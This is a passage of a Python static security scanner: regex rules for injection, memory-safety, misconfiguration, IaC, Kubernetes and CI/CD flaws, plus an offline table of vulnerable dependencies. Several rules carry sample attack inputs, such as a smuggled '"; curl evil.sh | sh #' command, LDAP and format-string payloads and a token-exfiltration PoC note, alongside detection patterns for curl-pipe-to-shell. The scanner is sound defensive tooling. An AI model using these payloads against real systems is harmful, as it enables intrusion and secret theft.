       r"move_uploaded_file\s*\([^)]*\[[\"']name[\"']\]|\.save\(\s*(?:os\.path\.join\([^)]*)?(?:file|f|upload)\.filename|originalname|FileOutputStream\([^)]*getOriginalFilename",
       cwe="CWE-434", owasp=A04, ex="shell.php", poc="Upload `shell.php` and request it.", conf=0.78),
    _r("php-extract", "high", "Injection", "extract()/register_globals on request data",
       "Never extract superglobals; read keys explicitly.", r"\bextract\s*\(\s*\$_(?:GET|POST|REQUEST|COOKIE)|\bparse_str\s*\([^,)]*\)",
       exts=PHP, cwe="CWE-621", owasp=A04, ex="?_SESSION[admin]=1", poc="Overwrite internal variables via query keys.", conf=0.85),
    _r("ldap-injection", "high", "Injection", "LDAP filter built from input",
       "Escape with ldap.filter.escape_filter_chars / parameterised filters.",
       r"(?i)(?:search_s?|search|ldap_search)\s*\([^)]*[\"']\(\w+=[\"']?\s*(?:\+|%|\.format|\$\{)|\(\s*(?:uid|cn)=[\"']\s*\+",
       cwe="CWE-90", owasp=A03, ex="*)(uid=*))(|(uid=*", poc="Inject wildcard filter syntax into the username.", conf=0.78),
    _r("xpath-injection", "high", "Injection", "XPath query built from input",
       "Use parameterised XPath.", r"(?i)(?:xpath|selectNodes|SelectSingleNode)\s*\([^)]*(?:\+|%|\.format|f[\"'])",
       cwe="CWE-643", owasp=A03, ex="' or '1'='1", poc="Inject a tautology into the XPath predicate.", conf=0.78),
    _r("log-injection", "low", "Logging", "Request value logged without sanitising",
       "Strip CR/LF or use structured logging.",
       r"(?:logger|logging|log|console)\.(?:info|warn|warning|error|debug|log)\s*\([^)]*(?:request\.(?:args|form|json|headers)|req\.(?:query|body|headers))",
       cwe="CWE-117", owasp=A09, ex="x\\nINFO admin logged in", poc="Inject newline-forged log lines.", conf=0.66),
    _r("regex-from-input", "medium", "Injection", "Regular expression compiled from request input",
       "Escape the input (re.escape) and bound its length.", r"(?:re\.compile|new\s+RegExp|Pattern\.compile|regexp\.MustCompile)\s*\(\s*" + _REQ,
       cwe="CWE-1333", owasp=A04, ex="(a+)+$", poc="Send a catastrophic-backtracking pattern and time the response.", conf=0.7),
    # ---- C / memory --------------------------------------------------------
    _r("c-unsafe-fn", "high", "Memory safety", "Unbounded C string/IO function",
       "Use the bounded variant (snprintf, strncpy with size, fgets).",
       r"\b(?:gets|strcpy|strcat|sprintf|vsprintf|scanf)\s*\(", exts=C, cwe="CWE-120", owasp=A03,
       ex="A" * 0 + "AAAA... longer than the destination buffer", poc="Feed input longer than the buffer under ASan.", conf=0.8, code_only=True),
    _r("c-format-string", "high", "Memory safety", "printf-style call with a non-literal format",
       "Use a constant format string: printf(\"%s\", x).", r"\b(?:printf|fprintf|syslog)\s*\(\s*(?:\w+\s*,\s*)?[a-zA-Z_]\w*\s*\)",
       exts=C, cwe="CWE-134", owasp=A03, ex="%x%x%x%n", poc="Send format specifiers and read stack words.", conf=0.72),
    _r("c-system", "high", "Command injection", "system()/popen() in C",
       "Use execve with an argument vector.", r"\b(?:system|popen)\s*\(", exts=C, cwe="CWE-78", owasp=A03, conf=0.75, code_only=True),
    _r("go-fmt-print-input", "medium", "Injection", "User input used as a format string",
       "Use Fprint / a constant format.", r"fmt\.Fprintf\(\s*w\s*,\s*(?:r\.|req\.)", exts=GO, cwe="CWE-134", owasp=A03,
       ex="%!(EXTRA)", poc="Send format verbs and inspect the output.", conf=0.78),
    # ---- Misconfiguration --------------------------------------------------
    _r("cors-wildcard", "medium", "CORS", "CORS allows any origin (*)",
       "Restrict allowed origins to an explicit allow-list.",
       r"(?i)(Access-Control-Allow-Origin[\"']?\s*[\]:,=]\s*[\"']\*|allow_origins\s*=\s*\[?\s*[\"']\*|(?<![\w])origin\s*:\s*[\"']\*[\"']|AllowAnyOrigin|CORS_ALLOW_ALL_ORIGINS\s*=\s*True|CORS_ORIGIN_ALLOW_ALL\s*=\s*True|\.allowedOrigins\(\s*\"\*\")",
       cwe="CWE-942", owasp=A05, ex="Origin: https://evil.example", poc="Cross-origin credentialed fetch from another origin.", conf=0.8),
    _r("cors-reflect", "high", "CORS", "CORS reflects the request Origin with credentials",
       "Validate Origin against an allow-list.", r"(?i)Access-Control-Allow-Origin[\"']?\s*[\],:=]\s*(?:req|request)\.headers",
       cwe="CWE-942", owasp=A05, ex="Origin: https://evil.example", poc="Send a spoofed Origin and see it reflected.", conf=0.85),
    _r("debug-true", "medium", "Configuration", "Debug mode enabled",
       "Gate debug by environment; never ship it on.",
       r"(?<![\w.])(?:DEBUG|app\.debug)\s*=\s*True\b|debug\s*=\s*True\b|\.config\[[\"']DEBUG[\"']\]\s*=\s*True|app\.run\([^)]*debug\s*=\s*True|APP_DEBUG\s*=\s*true|display_errors\s*=\s*(?:On|1)",
       exts=PY | PHP | {".env", ".ini"}, cwe="CWE-489", owasp=A05, ex="/console (Werkzeug)", poc="Trigger an error and read the stack trace or open the debugger console.", conf=0.78, code_only=True),
    _r("bind-all", "low", "Configuration", "Service bound to all interfaces",
       "Bind to 127.0.0.1 or a private interface behind a proxy.",
       r"(?:host\s*=\s*[\"']0\.0\.0\.0[\"']|listen\(\s*\d+\s*,\s*[\"']0\.0\.0\.0|ListenAndServe\(\s*[\"']:|bind\s*[\"']0\.0\.0\.0)",
       cwe="CWE-668", owasp=A05, conf=0.66, code_only=True),
    _r("allowed-hosts", "medium", "Configuration", "Host header validation disabled",
       "List explicit hostnames.", r"ALLOWED_HOSTS\s*=\s*\[\s*[\"']\*[\"']",
       exts=PY, cwe="CWE-644", owasp=A05, ex="Host: evil.example", poc="Poison password-reset links with a forged Host.", conf=0.82),
    _r("django-insecure-key", "high", "Secrets", "Django SECRET_KEY hardcoded",
       "Load from env; rotate to invalidate sessions.", r"SECRET_KEY\s*=\s*[\"'][^\"']{10,}[\"']",
       exts=PY, cwe="CWE-798", owasp=A02, conf=0.85, exclude=_PLACEHOLDER),
    _r("flask-secret", "high", "Secrets", "Flask secret_key hardcoded",
       "Load from env.", r"(?:secret_key|SECRET_KEY)[\"'\]]?\s*[=\]]\s*=?\s*[\"'][^\"']{6,}[\"']",
       exts=PY, cwe="CWE-798", owasp=A02, conf=0.82, exclude=_PLACEHOLDER),
    _r("pdb-trace", "low", "Configuration", "Debugger breakpoint left in code",
       "Remove it.", r"\bpdb\.set_trace\(\)|\bbreakpoint\(\)|\bdebugger;|binding\.pry|byebug",
       exts=PY | JS | RB, cwe="CWE-489", owasp=A05, conf=0.7),
    _r("assert-auth", "low", "Authentication", "Authorization decided with assert (stripped under -O)",
       "Raise an explicit exception.", r"^\s*assert\s+[^,\n]*\b(?:is_admin|admin|is_staff|is_authenticated|has_perm|permission|role)\b",
       exts=PY, cwe="CWE-617", owasp=A01, conf=0.7),
    _r("chmod-777", "medium", "Configuration", "World-writable permissions",
       "Use the minimal mode (640/750).", r"chmod\s+(?:-R\s+)?0?777|os\.chmod\([^)]*0o?777|FileMode\(0?777\)|chmod\(\s*0?777",
       cwe="CWE-732", owasp=A05, conf=0.82, code_only=True),
    _r("curl-pipe-sh", "high", "Supply chain", "Remote script piped into a shell",
       "Download, verify checksum/signature, then run.", r"(?:curl|wget)\s[^|\n]*\|\s*(?:sudo\s+)?(?:ba|z)?sh\b",
       cwe="CWE-494", owasp=A08, ex="compromised install.sh", poc="Serve a tampered script at the URL.", conf=0.88, code_only=True),
    _r("sensitive-log", "medium", "Logging", "Password/token written to logs",
       "Never log credentials; mask them.",
       r"(?i)(?:log(?:ger)?\.\w+|console\.\w+|print|println|printf)\s*\([^)]*(?:[\s,(]\b(?:password|passwd|secret|api[_-]?key|(?:access|auth|refresh|bearer|id)[_-]?token)\b\s*[,)\]}]|[{$]\{?\s*(?:password|passwd|secret|api[_-]?key|(?:access|auth|refresh|bearer)[_-]?token)\b)",
       cwe="CWE-532", owasp=A09, conf=0.7),
    # ---- Terraform / cloud -------------------------------------------------
    _r("tf-public-ingress", "high", "IaC", "Security group open to the world on a sensitive port",
       "Restrict cidr_blocks to known ranges or a VPN.",
       r"cidr_blocks\s*=\s*\[\s*\"0\.0\.0\.0/0\"|ipv6_cidr_blocks\s*=\s*\[\s*\"::/0\"",
       exts=TF, cwe="CWE-284", owasp=A05, conf=0.82),
    _r("tf-public-s3", "critical", "IaC", "S3 bucket with a public ACL",
       "Use private ACLs and enable Block Public Access.", r"acl\s*=\s*\"public-read(?:-write)?\"|block_public_(?:acls|policy)\s*=\s*false|restrict_public_buckets\s*=\s*false",
       exts=TF, cwe="CWE-732", owasp=A05, conf=0.9),
    _r("tf-unencrypted", "high", "IaC", "Storage or database encryption disabled",
       "Enable encryption at rest with a KMS key.", r"(?:storage_encrypted|encrypted|kms_key_id|enable_encryption|encryption_enabled)\s*=\s*(?:false|\"\")",
       exts=TF, cwe="CWE-311", owasp=A02, conf=0.85),
    _r("tf-public-db", "critical", "IaC", "Database reachable from the internet",
       "Set publicly_accessible=false and put it in a private subnet.", r"publicly_accessible\s*=\s*true|associate_public_ip_address\s*=\s*true",
       exts=TF, cwe="CWE-284", owasp=A05, conf=0.82),
    _r("tf-iam-wildcard", "high", "IaC", "IAM policy grants * actions or * resources",
       "Scope actions and resources to least privilege.", r"(?i)\"?Action\"?\s*[:=]\s*\[?\s*\"\*\"|\"?Resource\"?\s*[:=]\s*\[?\s*\"\*\"|actions\s*=\s*\[\s*\"\*\"",
       exts=TF | {".json", ".yml", ".yaml"}, cwe="CWE-269", owasp=A01, conf=0.8),
    _r("tf-logging-off", "medium", "IaC", "Audit logging disabled",
       "Enable CloudTrail/flow logs/access logs.", r"enable_logging\s*=\s*false|enable_log_file_validation\s*=\s*false|logging_enabled\s*=\s*false",
       exts=TF, cwe="CWE-778", owasp=A09, conf=0.8),
    _r("tf-hardcoded-password", "high", "Secrets", "Password in Terraform",
       "Use a secrets manager data source or a sensitive variable.", r"(?i)\b(?:password|secret|access_key|token)\s*=\s*\"[^\"$]{6,}\"",
       exts=TF, cwe="CWE-798", owasp=A07, conf=0.82, exclude=_PLACEHOLDER),
    _r("tf-skip-snapshot", "low", "IaC", "Database deletion without final snapshot",
       "Set skip_final_snapshot=false.", r"skip_final_snapshot\s*=\s*true", exts=TF, cwe="CWE-693", owasp=A05, conf=0.7),
    # ---- Kubernetes --------------------------------------------------------
    _r("k8s-privileged", "critical", "Kubernetes", "Privileged container",
       "Drop privileged and add only the capabilities needed.", r"^\s*privileged:\s*true\b",
       exts=YAML, cwe="CWE-250", owasp=A05, conf=0.9),
    _r("k8s-host-ns", "high", "Kubernetes", "Pod shares host namespaces",
       "Remove hostNetwork/hostPID/hostIPC.", r"^\s*host(?:Network|PID|IPC):\s*true\b",
       exts=YAML, cwe="CWE-250", owasp=A05, conf=0.88),
    _r("k8s-root", "medium", "Kubernetes", "Container runs as root or can escalate",
       "Set runAsNonRoot: true and allowPrivilegeEscalation: false.", r"^\s*(?:runAsUser:\s*0\b|allowPrivilegeEscalation:\s*true|runAsNonRoot:\s*false|readOnlyRootFilesystem:\s*false)",
       exts=YAML, cwe="CWE-250", owasp=A05, conf=0.8),
    _r("k8s-docker-sock", "critical", "Kubernetes", "Docker socket or host path mounted",
       "Never mount the Docker socket; avoid hostPath.", r"/var/run/docker\.sock|^\s*hostPath:",
       exts=YAML, cwe="CWE-668", owasp=A05, conf=0.85),
    _r("k8s-latest-tag", "low", "Kubernetes", "Image uses the mutable :latest tag",
       "Pin an immutable version or digest.", r"^\s*-?\s*image:\s*[^\s#]+:latest\b|^\s*-?\s*image:\s*[^\s:@#]+\s*$",
       exts=YAML, cwe="CWE-1104", owasp=A06, conf=0.7),
    _r("k8s-cluster-admin", "high", "Kubernetes", "Wildcard RBAC or cluster-admin binding",
       "Grant least-privilege roles.", r"(?:verbs|resources|apiGroups):\s*\[\s*[\"']\*[\"']|name:\s*cluster-admin\b",
       exts=YAML, cwe="CWE-269", owasp=A01, conf=0.8),
    # ---- CI/CD -------------------------------------------------------------
    _r("gha-pr-target", "high", "CI/CD", "pull_request_target runs with write token on fork code",
       "Use pull_request, or never check out untrusted refs under this trigger.", r"^\s*(?:on:\s*)?pull_request_target\b|^\s*-?\s*pull_request_target\b",
       exts=YAML, cwe="CWE-829", owasp=A08, ex="PR from a fork that edits a script run by the job", poc="Open a fork PR that exfiltrates GITHUB_TOKEN.", conf=0.85),
    _r("gha-injection", "critical", "CI/CD", "GitHub Actions expression injection in run:",
       "Pass the value through env: and quote it.", r"\$\{\{\s*github\.(?:event\.(?:issue|pull_request|comment|review|head_commit|commits)[\w.\[\]*]*|head_ref)\s*\}\}",
       exts=YAML, cwe="CWE-94", owasp=A03, ex='"; curl evil.sh | sh #', poc="Open an issue whose title closes the quote and runs a command.", conf=0.85),
    _r("gha-write-all", "medium", "CI/CD", "Workflow token has write-all permissions",
       "Set least-privilege `permissions:` per job.", r"permissions:\s*write-all",
       exts=YAML, cwe="CWE-250", owasp=A05, conf=0.88),
    _r("gha-unpinned", "medium", "CI/CD", "Action pinned to a moving ref",
       "Pin to a full commit SHA.", r"uses:\s*[\w./-]+@(?:master|main|latest)\b",
       exts=YAML, cwe="CWE-829", owasp=A08, conf=0.8),
    # ---- Dockerfile --------------------------------------------------------
    _r("docker-latest", "low", "Docker", "Base image uses the latest tag",
       "Pin a version or digest.", r"^\s*FROM\s+(?!\$|scratch\b)[^\s:@]+(?::latest)?\s*(?:AS\s+\w+)?\s*$", exts={".dockerfile"}, cwe="CWE-1104", owasp=A06, conf=0.7, flags=re.I),
    _r("docker-add-url", "medium", "Docker", "ADD fetches a remote URL",
       "Use curl with checksum verification then COPY.", r"^\s*ADD\s+https?://", exts={".dockerfile"}, cwe="CWE-494", owasp=A08, conf=0.8, flags=re.I),
    _r("docker-secret-env", "high", "Docker", "Secret baked into an image layer via ENV/ARG",
       "Use build secrets (--mount=type=secret) or runtime env.", r"(?i)^\s*(?:ENV|ARG)\s+\w*(?:PASSWORD|SECRET|TOKEN|API_?KEY)\w*[= ]\s*\S{6,}",
       exts={".dockerfile"}, cwe="CWE-798", owasp=A07, conf=0.85, exclude=_PLACEHOLDER),
    _r("docker-ssh-port", "medium", "Docker", "SSH port exposed from a container",
       "Use docker exec / kubectl exec instead of sshd.", r"^\s*EXPOSE\s+.*\b22\b", exts={".dockerfile"}, cwe="CWE-284", owasp=A05, conf=0.75, flags=re.I),
    # ---- Java / .NET / Spring ---------------------------------------------
    _r("spring-actuator", "high", "Configuration", "All Spring actuator endpoints exposed",
       "Expose only health/info and secure the rest.", r"management\.endpoints\.web\.exposure\.include\s*=\s*\*|management\.security\.enabled\s*=\s*false",
       exts={".properties", ".yml", ".yaml"}, cwe="CWE-200", owasp=A05, ex="/actuator/env, /actuator/heapdump", poc="GET /actuator/heapdump and grep for secrets.", conf=0.85),
    _r("java-weak-random", "low", "Cryptography", "java.util.Random used where unpredictability matters",
       "Use SecureRandom.", r"new\s+(?:java\.util\.)?Random\s*\(", exts=JAVA | CS, cwe="CWE-338", owasp=A02, conf=0.66, code_only=True),
    _r("ssl-default-sockets", "medium", "TLS", "Hostname verification disabled",
       "Keep the default hostname verifier.", r"setHostnameVerifier|HostnameVerifier\s*\(\)\s*\{|CheckPeerName\s*=\s*false",
       exts=JAVA | CS, cwe="CWE-297", owasp=A02, conf=0.72),
]


# --------------------------------------------------------------------------
# Whole-file checks
# --------------------------------------------------------------------------

def _finding(rule_id: str, sev: str, cat: str, summary: str, rec: str, rel: str, line: int,
             *, cwe: str = "", owasp: str = "", conf: float = 0.8, ex: str = "", poc: str = "",
             source: str = "heuristic") -> dict[str, Any]:
    return {
        "id": rule_id, "severity": sev, "category": cat, "summary": summary,
        "explanation": summary, "recommendation": rec, "file_path": rel, "line": line,
        "source": source, "cwe": cwe, "owasp": owasp, "confidence": conf,
        "malicious_input_example": ex, "poc_sketch": poc,
    }


def file_checks(rel: str, text: str) -> list[dict[str, Any]]:
    """Checks that need the whole file (missing hardening, tracked secrets)."""
    out: list[dict[str, Any]] = []
    name = rel.rsplit("/", 1)[-1]
    lower = name.lower()
    if lower == "dockerfile" or lower.endswith(".dockerfile") or lower.startswith("dockerfile."):
        if not re.search(r"(?im)^\s*USER\s+(?!root\b|0\b)\S+", text):
            out.append(_finding(
                "docker-root-user", "medium", "Docker",
                "Container runs as root (no non-root USER)",
                "Add a non-root USER before CMD/ENTRYPOINT.", rel, 1, cwe="CWE-250", owasp=A05,
                conf=0.82, ex="container escape primitives", poc="Exec into the container and run id: uid=0."))
        if not re.search(r"(?im)^\s*HEALTHCHECK\b", text):
            out.append(_finding("docker-no-healthcheck", "info", "Docker", "No HEALTHCHECK defined",
                                "Add a HEALTHCHECK so orchestrators detect a hung process.", rel, 1,
                                cwe="CWE-693", owasp=A05, conf=0.7))
    if lower == ".env" or lower.startswith(".env."):
        if not lower.endswith((".example", ".sample", ".template")):
            out.append(_finding(
                "env-file-committed", "high", "Secrets", "Environment file present in the tree",
                "Add it to .gitignore, purge from history, rotate every value.", rel, 1,
                cwe="CWE-540", owasp=A05, conf=0.8, ex="git log -p -- .env",
                poc="Run `git log -p -- .env` to recover every historical value."))
    if lower.endswith((".pem", ".key", ".p12", ".pfx")) or lower in {"id_rsa", "id_dsa", "id_ecdsa", "id_ed25519"}:
        out.append(_finding("key-file-committed", "critical", "Secrets", "Key or certificate file in the tree",
                            "Remove, rotate, and keep keys out of source control.", rel, 1,
                            cwe="CWE-321", owasp=A02, conf=0.88))
    if rel.endswith((".yml", ".yaml")) and re.search(r"(?m)^kind:\s*(Deployment|StatefulSet|DaemonSet|Pod|Job|CronJob)\b", text):
        if "securityContext" not in text:
            out.append(_finding("k8s-no-securitycontext", "medium", "Kubernetes",
                                "Workload without a securityContext", "Set runAsNonRoot, drop capabilities, read-only root fs.",
                                rel, 1, cwe="CWE-250", owasp=A05, conf=0.75))
        for m in re.finditer(r"(?i)-\s*name:\s*\w*(?:PASSWORD|SECRET|TOKEN|API_?KEY)\w*\s*\n\s*value:\s*[\"']?([^\"'\s${}<]{6,})", text):
            if not _PLACEHOLDER.search(m.group(1)):
                out.append(_finding("k8s-env-secret", "high", "Kubernetes", "Secret value inline in a manifest env",
                                    "Use secretKeyRef or an External Secrets operator.", rel,
                                    text.count("\n", 0, m.start()) + 1, cwe="CWE-798", owasp=A07, conf=0.85,
                                    ex="kubectl get deploy -o yaml", poc="Anyone with read access to the manifest or the repo gets the secret."))
        if not re.search(r"(?m)^\s*limits:", text):
            out.append(_finding("k8s-no-limits", "low", "Kubernetes", "Containers without resource limits",
                                "Set CPU and memory limits.", rel, 1, cwe="CWE-770", owasp=A05, conf=0.7))
    if re.search(r"\.(?:py)$", rel) and re.search(r"(?m)^\s*@app\.route\(", text) and "login_required" not in text \
            and "before_request" not in text and "flask_login" not in text and "jwt_required" not in text:
        if re.search(r"(?i)/(?:admin|delete|debug|internal|users?)\b", text):
            out.append(_finding("flask-no-auth", "low", "Access control",
                                "Sensitive Flask routes with no authentication decorator in this file",
                                "Add an auth decorator or before_request check.", rel, 1,
                                cwe="CWE-306", owasp=A01, conf=0.66))
    if re.search(r"\.(?:js|ts)$", rel) and "express" in text and "helmet" not in text \
            and re.search(r"app\.(?:get|post|use)\(", text):
        out.append(_finding("express-no-helmet", "low", "Configuration", "Express app without helmet security headers",
                            "Use helmet() for CSP, HSTS, X-Frame-Options.", rel, 1, cwe="CWE-693", owasp=A05, conf=0.66))
    return out


# --------------------------------------------------------------------------
# Dependencies (offline known-vulnerable pins)
# --------------------------------------------------------------------------

# name -> (fixed_in, cve, severity, summary)
_NPM: dict[str, tuple[str, str, str, str]] = {
    "lodash": ("4.17.21", "CVE-2021-23337", "high", "Command injection / prototype pollution in lodash"),
    "minimist": ("1.2.6", "CVE-2021-44906", "critical", "Prototype pollution in minimist"),
    "jsonwebtoken": ("9.0.0", "CVE-2022-23529", "high", "Insecure key handling in jsonwebtoken"),
    "express": ("4.17.3", "CVE-2022-24999", "high", "qs prototype pollution via express"),
    "axios": ("1.6.0", "CVE-2023-45857", "medium", "CSRF token leak in axios"),
    "node-fetch": ("2.6.7", "CVE-2022-0235", "high", "Header leak on redirect in node-fetch"),
    "moment": ("2.29.4", "CVE-2022-31129", "high", "ReDoS in moment"),
    "handlebars": ("4.7.7", "CVE-2021-23369", "critical", "RCE via template in handlebars"),
    "ejs": ("3.1.7", "CVE-2022-29078", "critical", "SSTI RCE in ejs"),
    "serialize-javascript": ("3.1.0", "CVE-2020-7660", "high", "RCE in serialize-javascript"),
    "tar": ("6.1.9", "CVE-2021-37701", "high", "Arbitrary file write in tar"),
    "marked": ("4.0.10", "CVE-2022-21680", "high", "ReDoS in marked"),
}
_PIP: dict[str, tuple[str, str, str, str]] = {
    "pyyaml": ("5.4", "CVE-2020-14343", "critical", "Arbitrary code execution in PyYAML full_load"),
    "flask": ("2.2.5", "CVE-2023-30861", "high", "Session cookie disclosure in Flask"),
    "requests": ("2.31.0", "CVE-2023-32681", "medium", "Proxy-Authorization leak in requests"),
    "django": ("3.2.25", "CVE-2024-27351", "high", "Multiple fixed Django vulnerabilities"),
    "pyjwt": ("2.4.0", "CVE-2022-29217", "high", "Algorithm confusion in PyJWT"),
    "jinja2": ("3.1.3", "CVE-2024-22195", "medium", "XSS via xmlattr in Jinja2"),
    "urllib3": ("1.26.18", "CVE-2023-45803", "medium", "Request body leak on redirect in urllib3"),
    "pillow": ("10.0.1", "CVE-2023-4863", "high", "libwebp heap overflow in Pillow"),
    "cryptography": ("41.0.2", "CVE-2023-38325", "high", "Multiple fixed cryptography vulnerabilities"),
    "paramiko": ("3.4.0", "CVE-2023-48795", "medium", "Terrapin attack in paramiko"),
    "werkzeug": ("2.2.3", "CVE-2023-25577", "high", "Multipart DoS in Werkzeug"),
}


def _ver(v: str) -> tuple[int, ...]:
    nums = re.findall(r"\d+", v)[:4]
    return tuple(int(n) for n in nums) or (0,)


def _lt(a: str, b: str) -> bool:
    x, y = _ver(a), _ver(b)
    n = max(len(x), len(y))
    return x + (0,) * (n - len(x)) < y + (0,) * (n - len(y))


def _dep(rel: str, name: str, ver: str, fixed: str, cve: str, sev: str, summary: str, line: int) -> dict[str, Any]:
    return _finding(
        f"dep:{name}", sev, "Supply chain", f"{name} {ver} is vulnerable ({cve}): {summary}",
        f"Upgrade {name} to {fixed} or later.", rel, line, cwe="CWE-1104", owasp=A06, conf=0.9,
        ex=cve, poc=f"Resolve the lockfile: `{name}` is pinned at {ver}, fixed in {fixed}.", source="deps-offline")


def scan_dependencies(rel: str, text: str) -> list[dict[str, Any]]:
    out: list[dict[str, Any]] = []
    name = rel.rsplit("/", 1)[-1].lower()
    if name == "package.json":
        try:
            data = json.loads(text)
        except ValueError:
            return out
        for section in ("dependencies", "devDependencies"):
            for pkg, spec in (data.get(section) or {}).items():
                entry = _NPM.get(pkg.lower())
                if not entry or not isinstance(spec, str):
                    continue
                ver = spec.lstrip("^~>=< ")
                if re.match(r"\d", ver) and _lt(ver, entry[0]):
                    idx = text.find(f'"{pkg}"')
                    line = text.count("\n", 0, idx) + 1 if idx >= 0 else 1
                    out.append(_dep(rel, pkg, ver, entry[0], entry[1], entry[2], entry[3], line))
    elif name.startswith("requirements") and name.endswith(".txt"):
        for idx, raw in enumerate(text.splitlines(), start=1):
            m = re.match(r"\s*([A-Za-z0-9_.\-]+)\s*(?:==|<=|~=)\s*([0-9][\w.]*)", raw)
            if not m:
                continue
            entry = _PIP.get(m.group(1).lower())
            if entry and _lt(m.group(2), entry[0]):
                out.append(_dep(rel, m.group(1), m.group(2), entry[0], entry[1], entry[2], entry[3], idx))
    elif name in {"pom.xml", "build.gradle", "build.gradle.kts"}:
        m = re.search(r"log4j-core[^0-9]{1,40}(2\.\d+(?:\.\d+)?)", text)
        if m and _lt(m.group(1), "2.17.1"):
            line = text.count("\n", 0, m.start()) + 1
            out.append(_dep(rel, "log4j-core", m.group(1), "2.17.1", "CVE-2021-44228",
                            "critical", "Log4Shell remote code execution", line))
    return out


def is_dependency_manifest(rel: str) -> bool:
    n = Path(rel).name.lower()
    return n == "package.json" or (n.startswith("requirements") and n.endswith(".txt")) or n in {
        "pom.xml", "build.gradle", "build.gradle.kts"}
